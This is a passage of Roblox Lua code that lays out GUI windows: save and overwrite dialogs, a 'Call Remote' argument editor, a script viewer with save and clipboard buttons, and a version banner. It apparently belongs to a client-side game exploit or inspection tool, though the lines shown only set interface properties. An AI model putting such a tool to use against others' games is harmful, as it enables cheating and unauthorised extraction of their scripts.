FileName.Name = "FileName"
FileName.Parent = MainWindow
FileName.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
FileName.BackgroundTransparency = 0.2
FileName.BorderColor3 = Color3.fromRGB(40, 40, 40)
FileName.Position = UDim2.new(0.075, 0, 0.4, 0)
FileName.Size = UDim2.new(0.85, 0, 0, 30)
FileName.Font = Enum.Font.SourceSans
FileName.Text = ""
FileName.TextColor3 = Color3.fromRGB(255, 255, 255)
FileName.TextSize = 18
FileName.TextXAlignment = Enum.TextXAlignment.Left

SaveObjects.Name = "SaveObjects"
SaveObjects.Parent = MainWindow
SaveObjects.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
SaveObjects.BackgroundTransparency = 0.6
SaveObjects.BorderColor3 = Color3.fromRGB(40, 40, 40)
SaveObjects.Position = UDim2.new(0.075, 0, 0.625, 0)
SaveObjects.Size = UDim2.new(0, 20, 0, 20)
SaveObjects.ZIndex = 2
SaveObjects.Font = Enum.Font.SourceSans
SaveObjects.Text = ""
SaveObjects.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveObjects.TextSize = 18

enabled.Name = "enabled"
enabled.Parent = SaveObjects
enabled.BackgroundColor3 = Color3.fromRGB(96, 96, 96)
enabled.BackgroundTransparency = 0.4
enabled.BorderSizePixel = 0
enabled.Position = UDim2.new(0, 3, 0, 3)
enabled.Size = UDim2.new(0, 14, 0, 14)
enabled.Font = Enum.Font.SourceSans
enabled.Text = ""
enabled.TextSize = 14

Desc2.Name = "Desc2"
Desc2.Parent = MainWindow
Desc2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Desc2.BackgroundTransparency = 1
Desc2.Position = UDim2.new(0.075, 30, 0.625, 0)
Desc2.Size = UDim2.new(0.925, -30, 0, 20)
Desc2.Font = Enum.Font.SourceSans
Desc2.Text = "Save \"Object\" type values"
Desc2.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc2.TextSize = 14
Desc2.TextXAlignment = Enum.TextXAlignment.Left

Confirmation.Name = "Confirmation"
Confirmation.Parent = ROBLOX
Confirmation.Active = true
Confirmation.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Confirmation.BorderColor3 = Color3.fromRGB(30, 30, 30)
dragger.new(Confirmation)
Confirmation.Position = UDim2.new(0.3, 0, 0.349, 0)
Confirmation.Size = UDim2.new(0, 350, 0, 20)
Confirmation.Visible = false
Confirmation.ZIndex = 3

Title_3.Name = "Title"
Title_3.Parent = Confirmation
Title_3.BackgroundTransparency = 1
Title_3.Size = UDim2.new(1, 0, 1, 0)
Title_3.ZIndex = 3
Title_3.Font = Enum.Font.SourceSans
Title_3.Text = "    Confirm"
Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_3.TextSize = 14
Title_3.TextXAlignment = Enum.TextXAlignment.Left

MainWindow_2.Name = "MainWindow"
MainWindow_2.Parent = Confirmation
MainWindow_2.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
MainWindow_2.BackgroundTransparency = 0.1
MainWindow_2.BorderColor3 = Color3.fromRGB(40, 40, 40)
MainWindow_2.Size = UDim2.new(1, 0, 0, 150)
MainWindow_2.ZIndex = 2

Yes.Name = "Yes"
Yes.Parent = MainWindow_2
Yes.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Yes.BackgroundTransparency = 0.5
Yes.BorderColor3 = Color3.fromRGB(0, 0, 0)
Yes.Position = UDim2.new(0.075, 0, 1, -40)
Yes.Size = UDim2.new(0.4, 0, 0, 30)
Yes.ZIndex = 2
Yes.Font = Enum.Font.SourceSans
Yes.Text = "Yes"
Yes.TextColor3 = Color3.fromRGB(255, 255, 255)
Yes.TextSize = 18

Desc_2.Name = "Desc"
Desc_2.Parent = MainWindow_2
Desc_2.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
Desc_2.BackgroundTransparency = 1
Desc_2.Position = UDim2.new(0, 0, 0, 20)
Desc_2.Size = UDim2.new(1, 0, 0, 40)
Desc_2.ZIndex = 2
Desc_2.Font = Enum.Font.SourceSans
Desc_2.Text = "The file, FILENAME, already exists. Overwrite?"
Desc_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc_2.TextSize = 14
Desc_2.TextWrapped = true

No.Name = "No"
No.Parent = MainWindow_2
No.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
No.BackgroundTransparency = 0.5
No.BorderColor3 = Color3.fromRGB(0, 0, 0)
No.Position = UDim2.new(0.524, 0, 1, -40)
No.Size = UDim2.new(0.4, 0, 0, 30)
No.ZIndex = 2
No.Font = Enum.Font.SourceSans
No.Text = "No"
No.TextColor3 = Color3.fromRGB(255, 255, 255)
No.TextSize = 18

Caution.Name = "Caution"
Caution.Parent = ROBLOX
Caution.Active = true
Caution.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Caution.BorderColor3 = Color3.fromRGB(30, 30, 30)
dragger.new(Caution)
Caution.Position = UDim2.new(0.3, 0, 0.3, 0)
Caution.Size = UDim2.new(0, 350, 0, 20)
Caution.Visible = false
Caution.ZIndex = 5

Title_4.Name = "Title"
Title_4.Parent = Caution
Title_4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Title_4.BackgroundTransparency = 1
Title_4.Size = UDim2.new(1, 0, 1, 0)
Title_4.ZIndex = 5
Title_4.Font = Enum.Font.SourceSans
Title_4.Text = "    Caution"
Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_4.TextSize = 14
Title_4.TextStrokeColor3 = Color3.fromRGB(30, 30, 30)
Title_4.TextXAlignment = Enum.TextXAlignment.Left

MainWindow_3.Name = "MainWindow"
MainWindow_3.Parent = Caution
MainWindow_3.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
MainWindow_3.BackgroundTransparency = 0.1
MainWindow_3.BorderColor3 = Color3.fromRGB(40, 40, 40)
MainWindow_3.Size = UDim2.new(1, 0, 0, 150)
MainWindow_3.ZIndex = 4

Desc_3.Name = "Desc"
Desc_3.Parent = MainWindow_3
Desc_3.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Desc_3.BackgroundTransparency = 1
Desc_3.Position = UDim2.new(0, 0, 0, 20)
Desc_3.Size = UDim2.new(1, 0, 0, 42)
Desc_3.ZIndex = 4
Desc_3.Font = Enum.Font.SourceSans
Desc_3.Text = "The file, FILENAME, already exists. Overwrite?"
Desc_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc_3.TextSize = 14
Desc_3.TextStrokeColor3 = Color3.fromRGB(30, 30, 30)
Desc_3.TextWrapped = true

Ok.Name = "Ok"
Ok.Parent = MainWindow_3
Ok.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Ok.BackgroundTransparency = 0.5
Ok.BorderColor3 = Color3.fromRGB(0, 0, 0)
Ok.Position = UDim2.new(0.3, 0, 1, -40)
Ok.Size = UDim2.new(0.4, 0, 0, 30)
Ok.ZIndex = 4
Ok.Font = Enum.Font.SourceSans
Ok.Text = "Ok"
Ok.TextColor3 = Color3.fromRGB(255, 255, 255)
Ok.TextSize = 18
Ok.TextStrokeColor3 = Color3.fromRGB(30, 30, 30)

CallRemote.Name = "CallRemote"
CallRemote.Parent = ROBLOX
CallRemote.Active = true
CallRemote.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
CallRemote.BorderColor3 = Color3.fromRGB(40, 40, 40)
dragger.new(CallRemote)
CallRemote.Position = UDim2.new(0.3, 0, 0.3, 0)
CallRemote.Size = UDim2.new(0, 350, 0, 20)
CallRemote.Visible = false
CallRemote.ZIndex = 2

Title_5.Name = "Title"
Title_5.Parent = CallRemote
Title_5.BackgroundTransparency = 1
Title_5.Size = UDim2.new(1, 0, 1, 0)
Title_5.ZIndex = 2
Title_5.Font = Enum.Font.SourceSans
Title_5.Text = "Call Remote"
Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_5.TextSize = 14
Title_5.TextXAlignment = Enum.TextXAlignment.Left

MainWindow_4.Name = "MainWindow"
MainWindow_4.Parent = CallRemote
MainWindow_4.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
MainWindow_4.BackgroundTransparency = 0.1
MainWindow_4.BorderColor3 = Color3.fromRGB(40, 40, 40)
MainWindow_4.Size = UDim2.new(1, 0, 0, 200)

Desc_4.Name = "Desc"
Desc_4.Parent = MainWindow_4
Desc_4.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Desc_4.BackgroundTransparency = 1
Desc_4.BorderColor3 = Color3.fromRGB(30, 30, 30)
Desc_4.Position = UDim2.new(0, 0, 0, 20)
Desc_4.Size = UDim2.new(1, 0, 0, 20)
Desc_4.Font = Enum.Font.SourceSans
Desc_4.Text = "Arguments"
Desc_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc_4.TextSize = 14
Desc_4.TextWrapped = true

Arguments.Name = "Arguments"
Arguments.Parent = MainWindow_4
Arguments.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Arguments.BackgroundTransparency = 1
Arguments.BorderColor3 = Color3.fromRGB(30, 30, 30)
Arguments.Position = UDim2.new(0, 0, 0, 40)
Arguments.Size = UDim2.new(1, 0, 0, 80)
Arguments.BottomImage = "rbxasset://textures/blackBkg_square.png"
Arguments.CanvasSize = UDim2.new(0, 0, 0, 0)
Arguments.MidImage = "rbxasset://textures/blackBkg_square.png"
Arguments.TopImage = "rbxasset://textures/blackBkg_square.png"

DisplayReturned.Name = "DisplayReturned"
DisplayReturned.Parent = MainWindow_4
DisplayReturned.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
DisplayReturned.BackgroundTransparency = 0.6
DisplayReturned.BorderColor3 = Color3.fromRGB(30, 30, 30)
DisplayReturned.Position = UDim2.new(0.075, 0, 0.625, 0)
DisplayReturned.Size = UDim2.new(0, 20, 0, 20)
DisplayReturned.ZIndex = 2
DisplayReturned.Font = Enum.Font.SourceSans
DisplayReturned.Text = ""
DisplayReturned.TextColor3 = Color3.fromRGB(255, 255, 255)
DisplayReturned.TextSize = 18

enabled_2.Name = "enabled"
enabled_2.Parent = DisplayReturned
enabled_2.BackgroundColor3 = Color3.fromRGB(96, 96, 96)
enabled_2.BackgroundTransparency = 0.4
enabled_2.BorderSizePixel = 0
enabled_2.Position = UDim2.new(0, 3, 0, 3)
enabled_2.Size = UDim2.new(0, 14, 0, 14)
enabled_2.Visible = false
enabled_2.Font = Enum.Font.SourceSans
enabled_2.Text = ""
enabled_2.TextSize = 14

Desc2_2.Name = "Desc2"
Desc2_2.Parent = MainWindow_4
Desc2_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Desc2_2.BackgroundTransparency = 1
Desc2_2.BorderColor3 = Color3.fromRGB(30, 30, 30)
Desc2_2.Position = UDim2.new(0.075, 30, 0.625, 0)
Desc2_2.Size = UDim2.new(0.925, -30, 0, 20)
Desc2_2.Font = Enum.Font.SourceSans
Desc2_2.Text = "Display values returned"
Desc2_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Desc2_2.TextSize = 14
Desc2_2.TextXAlignment = Enum.TextXAlignment.Left

Add.Name = "Add"
Add.Parent = MainWindow_4
Add.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Add.BackgroundTransparency = 0.5
Add.BorderColor3 = Color3.fromRGB(30, 30, 30)
Add.Position = UDim2.new(0.8, 0, 0.625, 0)
Add.Size = UDim2.new(0, 20, 0, 20)
Add.Font = Enum.Font.SourceSansBold
Add.Text = "+"
Add.TextColor3 = Color3.fromRGB(255, 255, 255)
Add.TextSize = 24

Subtract.Name = "Subtract"
Subtract.Parent = MainWindow_4
Subtract.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Subtract.BackgroundTransparency = 0.5
Subtract.BorderColor3 = Color3.fromRGB(30, 30, 30)
Subtract.Position = UDim2.new(0.899, 0, 0.625, 0)
Subtract.Size = UDim2.new(0, 20, 0, 20)
Subtract.Font = Enum.Font.SourceSansBold
Subtract.Text = "-"
Subtract.TextColor3 = Color3.fromRGB(255, 255, 255)
Subtract.TextSize = 24

ArgumentTemplate.Name = "ArgumentTemplate"
ArgumentTemplate.Parent = MainWindow_4
ArgumentTemplate.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ArgumentTemplate.BackgroundTransparency = 0.5
ArgumentTemplate.BorderColor3 = Color3.fromRGB(40, 40, 40)
ArgumentTemplate.Size = UDim2.new(1, 0, 0, 20)
ArgumentTemplate.Visible = false

Type.Name = "Type"
Type.Parent = ArgumentTemplate
Type.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Type.BackgroundTransparency = 0.899
Type.BorderColor3 = Color3.fromRGB(30, 30, 30)
Type.Size = UDim2.new(0.4, 0, 0, 20)
Type.Font = Enum.Font.SourceSans
Type.Text = "Script"
Type.TextSize = 18

Value.Name = "Value"
Value.Parent = ArgumentTemplate
Value.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Value.BackgroundTransparency = 0.899
Value.BorderColor3 = Color3.fromRGB(30, 30, 30)
Value.Position = UDim2.new(0.4, 0, 0, 0)
Value.Size = UDim2.new(0.6, -12, 0, 20)
Value.Font = Enum.Font.SourceSans
Value.Text = ""
Value.TextSize = 14
Value.TextXAlignment = Enum.TextXAlignment.Left

Cancel_2.Name = "Cancel"
Cancel_2.Parent = MainWindow_4
Cancel_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Cancel_2.BackgroundTransparency = 0.5
Cancel_2.BorderColor3 = Color3.fromRGB(30, 30, 30)
Cancel_2.Size = UDim2.new(0.4, 0, 0, 30)
Cancel_2.Font = Enum.Font.SourceSans
Cancel_2.Text = "Cancel"
Cancel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Cancel_2.TextSize = 18

Ok_2.Name = "Ok"
Ok_2.Parent = MainWindow_4
Ok_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Ok_2.BackgroundTransparency = 0.5
Ok_2.BorderColor3 = Color3.fromRGB(30, 30, 30)
Ok_2.Position = UDim2.new(0.075, 0, 1, -40)
Ok_2.Size = UDim2.new(0.4, 0, 0, 30)
Ok_2.Font = Enum.Font.SourceSans
Ok_2.Text = "Call"
Ok_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Ok_2.TextSize = 18

TableCaution.Name = "TableCaution"
TableCaution.Parent = ROBLOX
TableCaution.Active = true
TableCaution.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
TableCaution.BorderColor3 = Color3.fromRGB(43, 43, 43)
dragger.new(TableCaution)
TableCaution.Position = UDim2.new(0.3, 0, 0.3, 0)
TableCaution.Size = UDim2.new(0, 350, 0, 20)
TableCaution.Visible = false
TableCaution.ZIndex = 2

MainWindow_5.Name = "MainWindow"
MainWindow_5.Parent = TableCaution
MainWindow_5.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
MainWindow_5.BackgroundTransparency = 0.1
MainWindow_5.BorderColor3 = Color3.fromRGB(43, 43, 43)
MainWindow_5.Size = UDim2.new(1, 0, 0, 150)

Ok_3.Name = "Ok"
Ok_3.Parent = MainWindow_5
Ok_3.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Ok_3.BackgroundTransparency = 0.5
Ok_3.BorderColor3 = Color3.fromRGB(30, 30, 30)
Ok_3.Position = UDim2.new(0.3, 0, 1, -40)
Ok_3.Size = UDim2.new(0.4, 0, 0, 30)
Ok_3.Font = Enum.Font.SourceSans
Ok_3.Text = "Ok"
Ok_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Ok_3.TextSize = 18

TableResults.Name = "TableResults"
TableResults.Parent = MainWindow_5
TableResults.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TableResults.BackgroundTransparency = 1
TableResults.Position = UDim2.new(0, 0, 0, 20)
TableResults.Size = UDim2.new(1, 0, 0, 80)
TableResults.BottomImage = "rbxasset://textures/blackBkg_square.png"
TableResults.CanvasSize = UDim2.new(0, 0, 0, 0)
TableResults.MidImage = "rbxasset://textures/blackBkg_square.png"
TableResults.TopImage = "rbxasset://textures/blackBkg_square.png"

TableTemplate.Name = "TableTemplate"
TableTemplate.Parent = MainWindow_5
TableTemplate.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
TableTemplate.BackgroundTransparency = 0.5
TableTemplate.BorderColor3 = Color3.fromRGB(191, 191, 191)
TableTemplate.Size = UDim2.new(1, 0, 0, 20)
TableTemplate.Visible = false

Type_2.Name = "Type"
Type_2.Parent = TableTemplate
Type_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Type_2.BackgroundTransparency = 0.899
Type_2.BorderColor3 = Color3.fromRGB(30, 30, 30)
Type_2.Size = UDim2.new(0.4, 0, 0, 20)
Type_2.Font = Enum.Font.SourceSans
Type_2.Text = "Script"
Type_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Type_2.TextSize = 18

Value_2.Name = "Value"
Value_2.Parent = TableTemplate
Value_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Value_2.BackgroundTransparency = 0.899
Value_2.BorderColor3 = Color3.fromRGB(30, 30, 30)
Value_2.Position = UDim2.new(0.4, 0, 0, 0)
Value_2.Size = UDim2.new(0.6, -12, 0, 20)
Value_2.Font = Enum.Font.SourceSans
Value_2.Text = "Script"
Value_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Value_2.TextSize = 14

Title_6.Name = "Title"
Title_6.Parent = TableCaution
Title_6.BackgroundTransparency = 1
Title_6.Size = UDim2.new(1, 0, 1, 0)
Title_6.ZIndex = 2
Title_6.Font = Enum.Font.SourceSans
Title_6.Text = "Caution"
Title_6.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_6.TextSize = 14
Title_6.TextXAlignment = Enum.TextXAlignment.Left

ScriptEditor.Name = "ScriptEditor"
ScriptEditor.Parent = ROBLOX
ScriptEditor.Active = true
ScriptEditor.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
ScriptEditor.BorderColor3 = Color3.fromRGB(30, 30, 30)
dragger.new(ScriptEditor)
ScriptEditor.Position = UDim2.new(0.3, 0, 0.3, 0)
ScriptEditor.Size = UDim2.new(0, 916, 0, 20)
ScriptEditor.Visible = false
ScriptEditor.ZIndex = 5

Title_7.Name = "Title"
Title_7.Parent = ScriptEditor
Title_7.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Title_7.BackgroundTransparency = 1
Title_7.Size = UDim2.new(1, 0, 1, 0)
Title_7.ZIndex = 5
Title_7.Font = Enum.Font.SourceSans
Title_7.Text = "Script Viewer"
Title_7.TextColor3 = Color3.fromRGB(255, 255, 255)
Title_7.TextSize = 14
Title_7.TextXAlignment = Enum.TextXAlignment.Left

Cover.Name = "Cover"
Cover.Parent = ScriptEditor
Cover.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
Cover.BorderColor3 = Color3.fromRGB(30, 30, 30)
Cover.Position = UDim2.new(0, 0, 3, 0)
Cover.Size = UDim2.new(0, 916, 0, 416)

EditorGrid.Name = "EditorGrid"
EditorGrid.Parent = ScriptEditor
EditorGrid.Active = true
EditorGrid.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
EditorGrid.BorderColor3 = Color3.fromRGB(30, 30, 30)
EditorGrid.Position = UDim2.new(0, 0, 3, 0)
EditorGrid.Size = UDim2.new(1, -16, 0, 400)

TopBar.Name = "TopBar"
TopBar.Parent = ScriptEditor
TopBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TopBar.BorderColor3 = Color3.fromRGB(30, 30, 30)
TopBar.Size = UDim2.new(1, 0, 3, 0)

ScriptBarLeft.Name = "ScriptBarLeft"
ScriptBarLeft.Parent = TopBar
ScriptBarLeft.Active = false
ScriptBarLeft.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
ScriptBarLeft.BorderColor3 = Color3.fromRGB(30, 30, 30)
ScriptBarLeft.Position = UDim2.new(1, -32, 0, 40)
ScriptBarLeft.Size = UDim2.new(0, 16, 0, 20)
ScriptBarLeft.AutoButtonColor = false

ArrowGraphic.Name = "Arrow Graphic"
ArrowGraphic.Parent = ScriptBarLeft
ArrowGraphic.BackgroundTransparency = 1
ArrowGraphic.BorderSizePixel = 0
ArrowGraphic.Position = UDim2.new(0.5, -4, 0.5, -4)
ArrowGraphic.Size = UDim2.new(0, 8, 0, 8)

Graphic.Name = "Graphic"
Graphic.Parent = ArrowGraphic
Graphic.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic.BackgroundTransparency = 0.699
Graphic.BorderSizePixel = 0
Graphic.Position = UDim2.new(0.25, 0, 0.375, 0)
Graphic.Size = UDim2.new(0.125, 0, 0.25, 0)

Graphic_2.Name = "Graphic"
Graphic_2.Parent = ArrowGraphic
Graphic_2.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic_2.BackgroundTransparency = 0.699
Graphic_2.BorderSizePixel = 0
Graphic_2.Position = UDim2.new(0.375, 0, 0.25, 0)
Graphic_2.Size = UDim2.new(0.125, 0, 0.5, 0)

Graphic_3.Name = "Graphic"
Graphic_3.Parent = ArrowGraphic
Graphic_3.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic_3.BackgroundTransparency = 0.699
Graphic_3.BorderSizePixel = 0
Graphic_3.Position = UDim2.new(0.5, 0, 0.125, 0)
Graphic_3.Size = UDim2.new(0.125, 0, 0.75, 0)

Graphic_4.Name = "Graphic"
Graphic_4.Parent = ArrowGraphic
Graphic_4.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic_4.BackgroundTransparency = 0.699
Graphic_4.BorderSizePixel = 0
Graphic_4.Position = UDim2.new(0.625, 0, 0, 0)
Graphic_4.Size = UDim2.new(0.125, 0, 1, 0)

ScriptBarRight.Name = "ScriptBarRight"
ScriptBarRight.Parent = TopBar
ScriptBarRight.Active = false
ScriptBarRight.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
ScriptBarRight.BorderColor3 = Color3.fromRGB(30, 30, 30)
ScriptBarRight.Position = UDim2.new(1, -16, 0, 40)
ScriptBarRight.Size = UDim2.new(0, 16, 0, 20)
ScriptBarRight.AutoButtonColor = false

ArrowGraphic_2.Name = "Arrow Graphic"
ArrowGraphic_2.Parent = ScriptBarRight
ArrowGraphic_2.BackgroundTransparency = 1
ArrowGraphic_2.BorderSizePixel = 0
ArrowGraphic_2.Position = UDim2.new(0.5, -4, 0.5, -4)
ArrowGraphic_2.Size = UDim2.new(0, 8, 0, 8)

Graphic_5.Name = "Graphic"
Graphic_5.Parent = ArrowGraphic_2
Graphic_5.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic_5.BackgroundTransparency = 0.699
Graphic_5.BorderSizePixel = 0
Graphic_5.Position = UDim2.new(0.625, 0, 0.375, 0)
Graphic_5.Size = UDim2.new(0.125, 0, 0.25, 0)

Graphic_6.Name = "Graphic"
Graphic_6.Parent = ArrowGraphic_2
Graphic_6.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic_6.BackgroundTransparency = 0.699
Graphic_6.BorderSizePixel = 0
Graphic_6.Position = UDim2.new(0.5, 0, 0.25, 0)
Graphic_6.Size = UDim2.new(0.125, 0, 0.5, 0)

Graphic_7.Name = "Graphic"
Graphic_7.Parent = ArrowGraphic_2
Graphic_7.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic_7.BackgroundTransparency = 0.699
Graphic_7.BorderSizePixel = 0
Graphic_7.Position = UDim2.new(0.375, 0, 0.125, 0)
Graphic_7.Size = UDim2.new(0.125, 0, 0.75, 0)

Graphic_8.Name = "Graphic"
Graphic_8.Parent = ArrowGraphic_2
Graphic_8.BackgroundColor3 = Color3.fromRGB(149, 149, 149)
Graphic_8.BackgroundTransparency = 0.699
Graphic_8.BorderSizePixel = 0
Graphic_8.Position = UDim2.new(0.25, 0, 0, 0)
Graphic_8.Size = UDim2.new(0.125, 0, 1, 0)

Clipboard.Name = "Clipboard"
Clipboard.Parent = TopBar
Clipboard.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Clipboard.BackgroundTransparency = 0.5
Clipboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
Clipboard.Position = UDim2.new(0, 0, 0, 20)
Clipboard.Size = UDim2.new(0, 80, 0, 20)
Clipboard.AutoButtonColor = false
Clipboard.Font = Enum.Font.SourceSans
Clipboard.Text = "To Clipboard"
Clipboard.TextColor3 = Color3.fromRGB(255, 255, 255)
Clipboard.TextSize = 14

SaveScript.Name = "SaveScript"
SaveScript.Parent = TopBar
SaveScript.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SaveScript.BackgroundTransparency = 0.5
SaveScript.BorderColor3 = Color3.fromRGB(0, 0, 0)
SaveScript.Position = UDim2.new(0, 80, 0, 20)
SaveScript.Size = UDim2.new(0, 80, 0, 20)
SaveScript.AutoButtonColor = false
SaveScript.Font = Enum.Font.SourceSans
SaveScript.Text = "Save Script"
SaveScript.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveScript.TextSize = 14

ScriptBar.Name = "ScriptBar"
ScriptBar.Parent = TopBar
ScriptBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ScriptBar.BorderColor3 = Color3.fromRGB(30, 30, 30)
ScriptBar.ClipsDescendants = true
ScriptBar.Position = UDim2.new(0, 0, 0, 40)
ScriptBar.Size = UDim2.new(1, -32, 0, 20)

Entry.Name = "Entry"
Entry.Parent = TopBar
Entry.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Entry.BackgroundTransparency = 1
Entry.Size = UDim2.new(0, 100, 1, 0)
Entry.Visible = false

Button.Name = "Button"
Button.Parent = Entry
Button.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
Button.BackgroundTransparency = .6
Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Button.ClipsDescendants = true
Button.Size = UDim2.new(1, 0, 1, 0)
Button.ZIndex = 4
Button.Font = Enum.Font.SourceSans
Button.Text = ""
Button.TextSize = 12
Button.TextColor3 = Color3.fromRGB(255, 255, 255);
Button.TextXAlignment = Enum.TextXAlignment.Left

Close.Name = "Close"
Close.Parent = Entry
Close.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Close.BackgroundTransparency = 1
Close.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close.Position = UDim2.new(1, -20, 0, 0)
Close.Size = UDim2.new(0, 20, 0, 20)
Close.ZIndex = 4
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextSize = 14
Close.TextColor3 = Color3.fromRGB(255, 255, 255)

Close_2.Name = "Close"
Close_2.Parent = ScriptEditor
Close_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Close_2.BackgroundTransparency = 1
Close_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Close_2.Position = UDim2.new(1, -20, 0, 0)
Close_2.Size = UDim2.new(0, 20, 0, 20)
Close_2.ZIndex = 5
Close_2.Font = Enum.Font.SourceSans
Close_2.Text = "X"
Close_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Close_2.TextSize = 14

IntroFrame.Name = "IntroFrame"
IntroFrame.Parent = ROBLOX
IntroFrame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
IntroFrame.BorderSizePixel = 0
IntroFrame.Position = UDim2.new(1, 30, 0, 0)
IntroFrame.Size = UDim2.new(0, 300, 1, 0)
IntroFrame.ZIndex = 2

Main_2.Name = "Main"
Main_2.Parent = IntroFrame
Main_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Main_2.BorderSizePixel = 0
Main_2.Position = UDim2.new(0, -30, 0, 0)
Main_2.Size = UDim2.new(0, 30, 0, 90)
Main_2.ZIndex = 4

ImageLabel.Parent = Main_2
ImageLabel.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.Size = UDim2.new(1, 0, 1, 0)
ImageLabel.ZIndex = 5
ImageLabel.ScaleType = Enum.ScaleType.Tile
ImageLabel.TileSize = UDim2.new(25, 0, 6, 0)

Title_8.Name = "Title"
Title_8.Parent = IntroFrame
Title_8.BackgroundTransparency = 1
Title_8.Position = UDim2.new(0, 100, 0, 110)
Title_8.Size = UDim2.new(0, 100, 0, 100)
Title_8.ZIndex = 4
Title_8.Image = "http://www.roblox.com/asset/?id=4540274383"
Title_8.ScaleType = Enum.ScaleType.Fit

Version_2.Name = "Version"
Version_2.Parent = IntroFrame
Version_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Version_2.BackgroundTransparency = 1
Version_2.Position = UDim2.new(0, 100, 0, 225)
Version_2.Size = UDim2.new(0, 100, 0, 30)
Version_2.ZIndex = 4
Version_2.Font = Enum.Font.SourceSansBold
Version_2.Text = "V2.0.1\nEdited by Google Chrome & CriShoux"
Version_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Version_2.TextSize = 19

Creator.Name = "Creator"
Creator.Parent = IntroFrame
Creator.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Creator.BackgroundTransparency = 1
Creator.Position = UDim2.new(0, 80, 0, 300)
Creator.Size = UDim2.new(0, 140, 0, 30)
Creator.ZIndex = 4
Creator.Font = Enum.Font.SourceSansBold
Creator.Text = ""
Creator.TextColor3 = Color3.fromRGB(255, 255, 255)
Creator.TextSize = 28
Creator.TextWrapped = true

BG.Name = "BG"
BG.Parent = IntroFrame
BG.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
BG.BackgroundTransparency = 1
BG.BorderSizePixel = 0
BG.Size = UDim2.new(1, 0, 1, 0)
BG.ZIndex = 3
BG.ScaleType = Enum.ScaleType.Tile
BG.TileSize = UDim2.new(4, 0, 1, 0)

Slant_2.Name = "Slant"
Slant_2.Parent = IntroFrame
Slant_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slant_2.BackgroundTransparency = 1
